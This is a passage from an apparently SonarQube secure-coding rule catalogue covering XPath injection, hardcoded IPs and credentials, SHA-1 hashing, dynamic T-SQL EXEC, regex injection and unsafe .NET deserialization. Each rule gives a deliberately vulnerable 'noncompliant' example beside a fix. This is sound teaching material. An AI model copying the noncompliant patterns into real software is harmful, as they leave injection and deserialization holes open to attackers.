<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following noncompliant code is vulnerable to XPath injections because untrusted data is concatenated to an XPath query without prior
validation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public boolean authenticate(HttpServletRequest req, XPath xpath, Document doc) throws XPathExpressionException {
  String user &#61; request.getParameter(&#34;user&#34;);
  String pass &#61; request.getParameter(&#34;pass&#34;);

  String expression &#61; &#34;/users/user[&#64;name&#61;&#39;&#34; &#43; user &#43; &#34;&#39; and &#64;pass&#61;&#39;&#34; &#43; pass &#43; &#34;&#39;]&#34;;

  return (boolean)xpath.evaluate(expression, doc, XPathConstants.BOOLEAN);
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public boolean authenticate(HttpServletRequest req, XPath xpath, Document doc) throws XPathExpressionException {
  String user &#61; request.getParameter(&#34;user&#34;);
  String pass &#61; request.getParameter(&#34;pass&#34;);

  String expression &#61; &#34;/users/user[&#64;name&#61;$user and &#64;pass&#61;$pass]&#34;;

  xpath.setXPathVariableResolver(v -&gt; {
    switch (v.getLocalPart()) {
      case &#34;user&#34;:
        return user;
      case &#34;pass&#34;:
        return pass;
      default:
        throw new IllegalArgumentException();
    }
  });

  return (boolean)xpath.evaluate(expression, doc, XPathConstants.BOOLEAN);
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of the
initially intended logic.</p>
<h4>Parameterized Queries</h4>
<p>For XPath injections, the cleanest way to do so is to use parameterized queries.</p>
<p>XPath allows for the usage of variables inside expressions in the form of <code>$variable</code>. XPath variables can be used to construct an XPath
query without needing to concatenate user arguments to the query at runtime. Here is an example of an XPath query with variables:</p>
<pre>
/users/user[&#64;user&#61;$user and &#64;pass&#61;$pass]
</pre>
<p>When the XPath query is executed, the user input is passed alongside it. During execution, when the values of the variables need to be known, a
resolver will return the correct user input for each variable. The contents of the variables are not considered application logic by the XPath
executor, and thus injection is not possible.</p>
<p>In the example, a parameterized XPath query is created, and an <code>XPathVariableResolver</code> is used to securely insert untrusted data into
the query, similar to parameterized SQL queries.</p>
<h4>Validation</h4>
<p>In case XPath parameterized queries are not available, the most secure way to protect against injections is to validate the input before using it
in an XPath query.</p>
<p><strong>Important</strong>: The application must do this validation server-side. Validating this client-side is insecure.</p>
<p>Input can be validated in multiple ways:</p>
<ul><li> By checking against a list of authorized and secure strings that the application is allowed to use in a query. </li><li> By ensuring user input is restricted to a specific range of characters (e.g., the regex <code>/^[a-zA-Z0-9]*$/</code> only allows alphanumeric
  characters.) </li><li> By ensuring user input does not include any XPath metacharacters, such as <code>&#34;</code>, <code>&#39;</code>, <code>/</code>, <code>&#64;</code>,
  <code>&#61;</code>, <code>*</code>, <code>[</code>, <code>]</code>, <code>(</code> and <code>)</code>. </li></ul>
<p>If user input is not considered valid, it should be rejected as it is unsafe.</p>
<p>For Java, OWASP’s Enterprise Security API offers <a href="https://www.javadoc.io/doc/org.owasp.esapi/esapi/latest/org/owasp/esapi/Encoder.html#encodeForXPath-java.lang.String-" rel="nofollow"><code>encodeForXPath</code></a>
which sanitizes metacharacters automatically.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html#xpath-injection" rel="nofollow">OWASP, XPath Injection
  Prevention Cheat Sheet</a> </li><li> <a href="https://www.ambionics.io/blog/hacking-watchguard-firewalls#vulnerability-2-time-based-xpath-injection" rel="nofollow">Ambionics, XPath Injection
  Section of &#34;Hacking WatchGuard Firewalls&#39;</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/643" rel="nofollow">MITRE, CWE-643</a> - Improper Neutralization of Data within XPath Expressions </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=ruby:S1313">
              ruby:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2006-5901" rel="nofollow">CVE-2006-5901</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2005-3725" rel="nofollow">CVE-2005-3725</a> </li></ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul><li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li><li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li></ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul><li> Can give information to an attacker about the network topology. </li><li> It’s a personal (assigned to an identifiable person) IP address. </li></ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
ip &#61; &#34;192.168.12.42&#34;; // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
ip &#61; IP_ADDRESS; // Compliant
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul><li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li><li> Broadcast address 255.255.255.255 </li><li> Non-routable address 0.0.0.0 </li><li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm" rel="nofollow">often match
  Object Identifiers</a> (OID) </li><li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc5737" rel="nofollow">RFC 5737</a> </li><li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc3849" rel="nofollow">RFC
  3849</a> </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=ruby:S2068">
              ruby:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2019-13466" rel="nofollow">CVE-2019-13466</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-15389" rel="nofollow">CVE-2018-15389</a> </li></ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It’s recommended to customize the configuration of this rule with additional credential words such as &#34;oauthToken&#34;, &#34;secret&#34;, …​</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li><li> Credentials are used in production environments. </li><li> Application re-distribution is required before updating the credentials. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Store the credentials in a configuration file that is not pushed to the code repository. </li><li> Store the credentials in a database. </li><li> Use your cloud provider’s service for managing secrets. </li><li> If a password has been disclosed through the source code: change it. </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li><li> <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li><li> <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">MITRE, CWE-259</a> - Use of Hard-coded Password </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD" rel="nofollow">Hard Coded Password</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tsql:S2068">
              tsql:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2019-13466" rel="nofollow">CVE-2019-13466</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-15389" rel="nofollow">CVE-2018-15389</a> </li></ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It’s recommended to customize the configuration of this rule with additional credential words such as &#34;oauthToken&#34;, &#34;secret&#34;, …​</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li><li> Credentials are used in production environments. </li><li> Application re-distribution is required before updating the credentials. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Store the credentials in a configuration file that is not pushed to the code repository. </li><li> Store the credentials in a database. </li><li> Use your cloud provider’s service for managing secrets. </li><li> If a password has been disclosed through the source code: change it. </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li><li> <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li><li> <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">MITRE, CWE-259</a> - Use of Hard-coded Password </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD" rel="nofollow">Hard Coded Password</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tsql:S2070">
              tsql:S2070
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href="/organizations/sopra-steria/rules?open&#61;tsql%3AS4790&amp;rule_key&#61;tsql%3AS4790" rel="nofollow">S4790</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>The MD5 algorithm and its successor, SHA-1, are no longer considered secure, because it is too easy to create hash collisions with them. That is,
it takes too little computational effort to come up with a different input that produces the same MD5 or SHA-1 hash, and using the new, same-hash
value gives an attacker the same access as if he had the originally-hashed value. This applies as well to the other Message-Digest algorithms: MD2,
MD4, MD6, HAVAL-128, HMAC-MD5, DSA (which uses SHA-1), RIPEMD, RIPEMD-128, RIPEMD-160, HMACRIPEMD160.</p>
<p>Consider using safer alternatives, such as SHA-256, SHA-512 or SHA-3.</p>
<h3>Noncompliant code example</h3>
<pre>
SELECT HASHBYTES(&#39;SHA1&#39;, MyColumn) FROM dbo.MyTable;
</pre>
<h3>Compliant solution</h3>
<pre>
SELECT HASHBYTES(&#39;SHA2_256&#39;, MyColumn) FROM dbo.MyTable;
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/328" rel="nofollow">MITRE, CWE-328</a> - Reversible One-Way Hash </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> <a href="https://shattered.io/" rel="nofollow">SHAttered</a> - The first concrete collision attack against SHA-1. </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tsql:S1313">
              tsql:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2006-5901" rel="nofollow">CVE-2006-5901</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2005-3725" rel="nofollow">CVE-2005-3725</a> </li></ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul><li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li><li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li></ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul><li> Can give information to an attacker about the network topology. </li><li> It’s a personal (assigned to an identifiable person) IP address. </li></ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
SET &#64;IP &#61; &#39;192.168.12.42&#39;; -- Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
SET &#64;IP  &#61; (SELECT ip_address FROM configuration);  -- Compliant
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul><li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li><li> Broadcast address 255.255.255.255 </li><li> Non-routable address 0.0.0.0 </li><li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm" rel="nofollow">often match
  Object Identifiers</a> (OID) </li><li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc5737" rel="nofollow">RFC 5737</a> </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tsql:S1523">
              tsql:S1523
            </a>
          </td>
          <td>
            <details>
              <p>Executing code dynamically is security sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-9807" rel="nofollow">CVE-2017-9807</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-9802" rel="nofollow">CVE-2017-9802</a> </li></ul>
<p>Some APIs enable the execution of dynamic code by providing it as strings at runtime. These APIs might be useful in some very specific
meta-programming use-cases. However most of the time their use is frowned upon as they also increase the risk of <a href="https://owasp.org/www-community/attacks/Code_Injection" rel="nofollow">Injected Code</a>. Such attacks can either run on the server or in the client (exemple:
XSS attack) and have a huge impact on an application’s security.</p>
<p>Both <code>EXECUTE( ... )</code> and <code>EXEC( ... )</code> execute as a command the string passed as an argument. They are safe only if the
argument is composed of constant character string expressions. But if the command string is dynamically built using external parameters, then it is
considered very dangerous because executing a random string allows the execution of arbitrary code.</p>
<p>This rule marks for review each occurrence of <code>EXEC</code> and <code>EXECUTE</code>. This rule does not detect code injections. It only
highlights the use of APIs which should be used sparingly and very carefully. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the executed code may come from an untrusted source and hasn’t been sanitized. </li><li> you really need to run code dynamically. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The best solution is to not run code provided by an untrusted source. If you really need to build a command string using external parameters, you
should use <code>EXEC sp_executesql</code> instead.</p>
<p>Do not try to create a blacklist of dangerous code. It is impossible to cover all attacks that way.</p>
<h2>Sensitive Code Example</h2>
<pre>
CREATE PROCEDURE USER_BY_EMAIL(&#64;email VARCHAR(255)) AS
BEGIN
  EXEC(&#39;USE AuthDB; SELECT id FROM user WHERE email &#61; &#39;&#39;&#39; &#43; &#64;email &#43; &#39;&#39;&#39; ;&#39;); -- Sensitive: could inject code using &#64;email
END
</pre>
<h2>Compliant Solution</h2>
<pre>
CREATE PROCEDURE USER_BY_EMAIL(&#64;email VARCHAR(255)) AS
BEGIN
  EXEC sp_executesql &#39;USE AuthDB; SELECT id FROM user WHERE email &#61; &#64;user_email;&#39;,
                     &#39;&#64;user_email VARCHAR(255)&#39;,
                      &#64;user_email &#61; &#64;email;
END
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/95" rel="nofollow">MITRE, CWE-95</a> - Improper Neutralization of Directives in Dynamically Evaluated Code
  (&#39;Eval Injection&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=tsql:S4790">
              tsql:S4790
            </a>
          </td>
          <td>
            <details>
              <p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,
<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,
<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little
computational effort is enough to find two or more different inputs that produce the same hash).</p>
<h2>Ask Yourself Whether</h2>
<p>The hashed value is used in a security context like:</p>
<ul><li> User-password storage. </li><li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li><li> To compute some message integrity. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even
better to use algorithms that do not compute too &#34;quickly&#34;, like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>
because it slows down <code>brute force attacks</code>.</p>
<h2>Sensitive Code Example</h2>
<pre>
SELECT HASHBYTES(&#39;SHA1&#39;, MyColumn) FROM dbo.MyTable;
</pre>
<h2>Compliant Solution</h2>
<pre>
SELECT HASHBYTES(&#39;SHA2_512&#39;, MyColumn) FROM dbo.MyTable;
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/1240" rel="nofollow">MITRE, CWE-1240</a> - Use of a Risky Cryptographic Primitive </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S2631">
              roslyn.sonaranalyzer.security.cs:S2631
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Regular expression injections occur when the application retrieves untrusted data and uses it as a regex to pattern match a string with it.</p>
<p>Most regular expression search engines use <em>backtracking</em> to try all possible regex execution paths when evaluating an input. Sometimes this
can lead to performance problems also referred to as <em>catastrophic backtracking</em> situations.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application vulnerable to regex injection:<br /> After discovering the injection point, attackers insert data into the
vulnerable field to make the affected component inaccessible.</p>
<p>Depending on the application’s software architecture and the injection point’s location, the impact may or may not be visible.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Self Denial of Service</h4>
<p>In cases where the complexity of the regular expression is exponential to the input size, a small, carefully-crafted input (for example, 20 chars)
can trigger <em>catastrophic backtracking</em> and cause a denial of service of the application.</p>
<p>Super-linear regex complexity can produce the same effects for a large, carefully crafted input (thousands of chars).</p>
<p>If the component jeopardized by this vulnerability is not a bottleneck that acts as a single point of failure (SPOF) within the application, the
denial of service might only affect the attacker who initiated it.</p>
<p>Such benign denial of service can also occur in architectures that rely heavily on containers and container orchestrators. Replication systems
would detect the failure of a container and automatically replace it.</p>
<h4>Infrastructure SPOFs</h4>
<p>However, a denial of service attack can be critical to the enterprise if it targets a SPOF component. Sometimes the SPOF is a software architecture
vulnerability (such as a single component on which multiple critical components depend) or an operational vulnerability (for example, insufficient
container creation capabilities or failures from containers to terminate).</p>
<p>In either case, attackers aim to exploit the infrastructure weakness by sending as many malicious payloads as possible, using potentially huge
offensive infrastructures.</p>
<p>These threats are particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>The following noncompliant code is vulnerable to Regex Denial of Service because untrusted data is used as a regex to scan a string without prior
sanitization or validation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public class ExampleController : Controller
{
    public IActionResult Validate(string regex, string input)
    {
        bool match &#61; Regex.IsMatch(input, regex);

        return Json(match);
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public class ExampleController : Controller
{
    public IActionResult Validate(string regex, string input)
    {
        bool match &#61; Regex.IsMatch(input, Regex.Escape(regex));

        return Json(match);
    }
}
</pre>
<h3>How does this work?</h3>
<h4>Sanitization and Validation</h4>
<p>Metacharacters escape using native functions is a solution against regex injection.<br /> The escape function sanitizes the input so that the regular
expression engine interprets these characters literally.</p>
<p>An allowlist approach can also be used by creating a list containing authorized and secure strings you want the application to use in a query.<br />
If a user input does not match an entry in this list, it should be considered unsafe and rejected.</p>
<p><strong>Important Note</strong>: The application must sanitize and validate on the server side. Not on client-side front end.</p>
<p>Where possible, use <em>non-backtracking</em> regex engines, for example, Google’s <a href="https://github.com/google/re2" rel="nofollow">re2</a>.</p>
<p>In the compliant solution example, <code>Regex.Escape</code> escapes metacharacters and escape sequences that could have broken the initially
intended logic.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS" rel="nofollow">OWASP Regular expression Denial of Service - ReDoS</a>
  </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/400" rel="nofollow">MITRE, CWE-400</a> - Uncontrolled Resource Consumption </li><li> <a href="https://cwe.mitre.org/data/definitions/1333" rel="nofollow">MITRE, CWE-1333</a> - Inefficient Regular Expression Complexity </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=roslyn.sonaranalyzer.security.cs:S5135">
              roslyn.sonaranalyzer.security.cs:S5135
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Deserialization injections occur when applications deserialize wholly or partially untrusted data without verification.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application performing unsafe deserialization:<br /> After detecting the injection vector, attackers inject a
carefully-crafted payload into the application.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Application-specific attacks</h4>
<p>In this scenario, the attackers succeed in injecting an object of the expected class, but with malicious properties that affect the object’s
behavior.</p>
<p>If the application relies on the properties of the deserialized object, attackers can modify the data structure or content to escalate privileges
or perform unwanted actions.<br /> In the context of an e-commerce application, this could be changing the number of products or prices.</p>
<h4>Full application compromise</h4>
<p>In the worst-case scenario, the attackers succeed in injecting an object of a completely different class than expected, triggering code
execution.</p>
<p>Depending on the attacker, code execution can be used with different intentions:</p>
<ul><li> Download the internal server’s data, most likely to sell it. </li><li> Modify data, install malware, for instance, malware that mines cryptocurrencies. </li><li> Stop services or exhaust resources, for instance, with fork bombs. </li></ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a Disaster Recovery Plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker additionally manages to
elevate his privileges as an administrator and attack other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
through a combination of unsafe deserialization and misconfiguration:</p>
<ul><li> Docker or Kubernetes clusters </li><li> cloud services </li><li> network firewalls and routing </li><li> OS access control </li></ul>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to deserialization attacks because it deserializes HTTP data without validating it first.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public class Example : Controller
{
    [HttpPost]
    public ActionResult Deserialize(HttpPostedFileBase inputFile)
    {
        ExpectedType expectedObject &#61; null;
        var formatter               &#61; new BinaryFormatter();
        expectedObject              &#61; (ExpectedType)formatter.Deserialize(inputFile.InputStream);
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public class Example : Controller
{
    [HttpPost]
    public ActionResult Deserialize(HttpPostedFileBase inputFile)
    {
        ExpectedType expectedObject &#61; null;
        JsonSerializer serializer   &#61; new JsonSerializer(typeof(expectedObject));
        expectedObject              &#61; (ExpectedType)serializer.Deserialize(inputFile.InputStream);
    }
}
</pre>
<h3>How does this work?</h3>
<p>Allowing users to provide data for deserialization generally creates more problems than it solves.</p>
<p>Anything that can be done through deserialization can generally be done with more secure data structures.<br /> Therefore, our first suggestion is to
avoid deserialization in the first place.</p>
<p>However, if deserialization mechanisms are valid in your context, here are some security suggestions.</p>
